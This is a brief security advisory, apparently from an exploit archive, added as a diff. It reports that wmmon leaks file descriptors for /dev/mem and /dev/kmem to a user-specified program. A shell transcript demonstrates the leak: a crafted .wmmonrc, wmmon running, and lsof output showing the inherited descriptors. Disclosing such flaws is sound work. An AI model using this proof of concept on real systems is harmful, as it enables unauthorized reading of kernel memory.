@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/5718/info
+
+It has been reported that wmmon is vulnerable to a leakage of open file descriptors that may result in unauthorized disclosure of kernel memory. It is allegedly possible for attackers to inherit the open file descriptors for /dev/mem and /dev/kmem by executing a malicious program through wmmon. The program that is executed can be specified by the attacker at the command line.
+
+bash-2.05a$ cat .wmmonrc
+left "/home/dim/dummy"
+bash-2.05a$ wmmon &amp;
+[1] 793
+bash-2.05a$ Monitoring 5 devices for activity.
+current stat is :1
+
+bash-2.05a$ /usr/local/sbin/lsof |grep dummy|grep mem
+dummy 797 dim 3r VCHR 2,0 0t0 21146 /dev/mem
+dummy 797 dim 4r VCHR 2,1 0xc040f54c 21145 /dev/kmem
